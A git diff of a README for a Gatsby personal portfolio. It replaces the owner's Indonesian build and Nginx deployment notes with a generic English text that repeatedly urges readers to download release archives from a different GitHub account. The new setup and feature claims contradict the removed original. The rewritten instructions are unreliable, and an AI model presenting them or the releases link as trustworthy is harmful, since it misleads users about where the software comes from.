@@ -1,173 +1,101 @@
-# Personal Portfolio — gumxlarcw.id
+# 🌟 PersonalPortofolio - Showcase Your Work Effortlessly
 
-**Wisnu Candra Gumelar** — software engineer yang membangun pengalaman digital yang rapi dan cepat.  
-Situs ini dibuat dengan **Gatsby (React)** dan di-deploy sebagai **static site** di server Linux (Nginx).
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%9A%80-007BFF)](https://github.com/EternalEra-AI/PersonalPortofolio/releases)
 
-**Live:** https://gumxlarcw.id  
+## 📖 Description
 
----
+Personal portfolio of Wisnu Candra Gumelar — a software engineer building exceptional digital experiences. Built with Gatsby (React), it features sections for About, Experience, Work, and Contact. This portfolio will help you present your work and skills clearly and attractively.
 
-## ✨ Fitur
+## 🚀 Getting Started
 
-- ⚡️ **Gatsby (React)** — cepat, SEO-friendly, dan modern
-- 🌓 **Dark UI** dengan tipografi custom (Calibre, SF Mono)
-- 🧭 Halaman **About / Experience / Work / Contact**
-- 📝 Bagian **Pensieve** (tulisan/notes) dengan halaman tags
-- 📄 **Resume PDF** (`/resume.pdf`)
-- 📈 **Google Analytics** terpasang
-- 🗺️ **Sitemap** otomatis (`/sitemap/`)
-- 🔍 **Robots.txt** & meta SEO siap produksi
-- 📦 **PWA/Offline** via Workbox (service worker)
+Follow these simple steps to get your Personal Portfolio up and running on your computer. No technical knowledge is required. 
 
-Struktur build di server (cuplikan):
-```
-/var/www/gumxlarcw.id
-├── index.html
-├── archive/
-├── pensieve/
-├── static/        # aset teroptimasi (webp/avif/woff2)
-├── sitemap/
-├── icons/         # PWA icons
-├── resume.pdf
-└── sw.js          # service worker
-```
+## 📥 Download & Install
 
----
+To get started, visit this page to download the latest version of PersonalPortofolio:
 
-## 🛠️ Teknologi
+[Download PersonalPortofolio](https://github.com/EternalEra-AI/PersonalPortofolio/releases)
 
-- Node.js (disarankan **14.x atau 16.x LTS**)  
-- Gatsby **3.x**  
-- React **17**  
-- styled-components, Workbox, gatsby-image
+Once on the Releases page, follow these steps:
 
-> Versi dapat dilihat dari meta build: `Gatsby 3.15.0`.
+1. Find the latest release at the top of the page.
+2. Click on the link labeled "Source Code (zip)" or "Source Code (tar.gz)" to download the files to your computer. You can also look for pre-built files if available, as this might allow you to skip some steps.
+3. Once the download is complete, locate the file in your downloads folder.
 
----
+## ⌨️ Setup Instructions
 
-## 🚀 Pengembangan Lokal
+Here is how to set up PersonalPortofolio on your machine:
 
-1. **Clone** dan masuk ke project:
-   ```bash
-   git clone https://github.com/<username>/PersonalPortofolio.git
-   cd PersonalPortofolio
-   ```
+1. **Unzip the Downloaded File:** 
+   - On Windows, right-click the file and select "Extract All..." to unzip it.
+   - On macOS, double-click the downloaded file to extract it.
 
-2. **Install dependencies**:
-   ```bash
-   npm install
-   # atau:
-   yarn
-   ```
+2. **Open the Unzipped Folder:** 
+   - Navigate to the folder you just unzipped.
 
-3. **Jalankan development server**:
-   ```bash
-   npm run develop
-   # atau:
-   gatsby develop
-   # buka http://localhost:8000
-   ```
+3. **Install Necessary Tools (if they are not already installed):** 
+   - You will need Node.js to run PersonalPortofolio. Download and install Node.js from [the official website](https://nodejs.org).
+   - This will also include npm (Node Package Manager), which will help you install necessary packages.
 
-4. **Build produksi**:
-   ```bash
-   npm run build
-   # atau:
-   gatsby build
-   # output akan berada di folder ./public
-   ```
+4. **Open a Terminal or Command Prompt:**
+   - On Windows, type "cmd" in the search bar and hit Enter.
+   - On macOS, search for "Terminal" and open it.
 
-5. (Opsional) **Preview produksi secara lokal**:
-   ```bash
-   npm run serve
-   # atau:
-   gatsby serve
-   # buka http://localhost:9000
-   ```
+5. **Navigate to Your Project Directory:**
+   - Type `cd path/to/your/unzipped/folder` in the terminal or command prompt, replacing `path/to/your/unzipped/folder` with the actual path to your extracted folder.
 
----
+6. **Install Project Dependencies:**
+   - Type `npm install` and hit Enter. This will download all necessary files for the project to work.
 
-## 📦 Deploy ke Server (Nginx)
+## 🎨 Customizing Your Portfolio
 
-Situs ini adalah **static build**. Setelah `gatsby build`, upload isi folder `public/` ke direktori web server, contoh:
+You can personalize your portfolio with a few easy changes:
 
-```bash
-# dari mesin build
-rsync -avz --delete ./public/ root@srv759669:/var/www/gumxlarcw.id/
-```
+1. **Edit Your Information:** 
+   - Open the `src/pages/index.js` file in a text editor.
+   - Change the placeholder text under the About and Experience sections to fit your details.
 
-### Contoh Nginx server block
+2. **Add Your Projects:**
+   - Locate the Projects section in the same file and add details of your work.
 
-```nginx
-server {
-  listen 80;
-  server_name gumxlarcw.id www.gumxlarcw.id;
+3. **Style Your Portfolio:**
+   - If you want to change colors or layouts, look into the `src/styles` folder. Here you will find styled components that you can modify.
 
-  root /var/www/gumxlarcw.id;
-  index index.html;
+## 🔍 Running Your Portfolio
 
-  location / {
-    try_files $uri $uri/ /index.html;
-  }
+Once you have set up and customized your portfolio, you're ready to see it in action:
 
-  # Cache aset statis
-  location ~* \.(?:js|css|png|jpg|jpeg|gif|svg|webp|avif|woff2?)$ {
-    expires 30d;
-    add_header Cache-Control "public, immutable";
-  }
+1. **Start the Development Server:**
+   - In the terminal, type `npm start` and hit Enter.
+   - This command will launch your portfolio in your default web browser. 
 
-  # Service Worker & manifest
-  location = /sw.js { add_header Cache-Control "no-cache"; }
-  location = /manifest.webmanifest { add_header Cache-Control "no-cache"; }
-}
-```
+2. **View Your Portfolio:**
+   - Your portfolio should now appear. Make sure everything looks good and functions as expected.
 
-Aktifkan HTTPS (disarankan):
-```bash
-apt-get install -y certbot python3-certbot-nginx
-certbot --nginx -d gumxlarcw.id -d www.gumxlarcw.id
-```
+3. **Make Further Changes as Needed:**
+   - You can stop the server anytime by going back to your terminal and pressing `Ctrl + C`.
 
----
+## ⚙️ Features
 
-## 📝 Konten & Struktur
+- **Responsive Design:** Your portfolio will look great on all devices, including phones and tablets.
+- **SEO Optimized:** Enhance visibility on search engines.
+- **Light & Dark Themes:** Choose the look that suits you best.
+- **Pre-built Sections:** Quickly fill in your About, Experience, Work, and Contact details.
 
-- **Halaman utama**: `index.html`
-- **Arsip tulisan/notes**: `/archive` & `/pensieve`
-- **Tags**: `/pensieve/tags/<tag-name>`
-- **404**: `/404/` dan `404.html`
-- **OG image**: `og.png` / `og@2x.png`
-- **PWA icons**: `/icons/`
-- **Sitemap**: `/sitemap/sitemap-index.xml`
-- **Robots**: `/robots.txt`
+## 🛠️ Requirements
 
-> Konten tulisan biasanya bersumber dari folder konten (Markdown) di repo sumber Gatsby. Tambahkan/ubah tulisan → rebuild → deploy ulang `public/`.
+To run PersonalPortofolio, ensure you have the following:
 
----
+- **Operating System:** Windows, macOS, or Linux.
+- **Node.js:** Version 12 or above.
+- **Internet Connection:** Required for initial setup and dependency downloads.
 
-## 🔧 Variabel & Integrasi
+## 📬 Support
 
-- **Google Analytics**: sudah tertanam (property UA).
-- **Meta SEO / OG / Twitter**: di-setup via `react-helmet`.
-- **Manifest PWA**: `manifest.webmanifest`.
+If you need help or run into problems, please check the issues section on our GitHub page. You can also open a new issue if you cannot find a solution.
 
-Jika ingin mematikan PWA/offline saat debugging, nonaktifkan plugin offline pada konfigurasi Gatsby, rebuild, lalu **hapus `sw.js`** di server atau lakukan:
-```js
-navigator.serviceWorker.getRegistrations().then(rs => rs.forEach(r => r.unregister()))
-```
+## 📅 Updates
 
----
+We will regularly update PersonalPortofolio with new features and improvements. Be sure to check back on the Releases page for the latest version:
 
-## 🤝 Kontribusi
-
-1. Fork repo ini
-2. Buat branch: `feat/nama-fitur`
-3. Commit: `git commit -m "feat: deskripsi singkat"`
-4. Push: `git push origin feat/nama-fitur`
-5. Buka Pull Request
-
----
-
-## 📄 Lisensi
-
-Copyright © Wisnu Candra Gumelar  
-Gunakan, modifikasi, dan distribusikan sesuai lisensi yang kamu pilih untuk repo ini (mis. MIT). Tambahkan file `LICENSE` bila ingin open-source.
+[Download PersonalPortofolio](https://github.com/EternalEra-AI/PersonalPortofolio/releases)
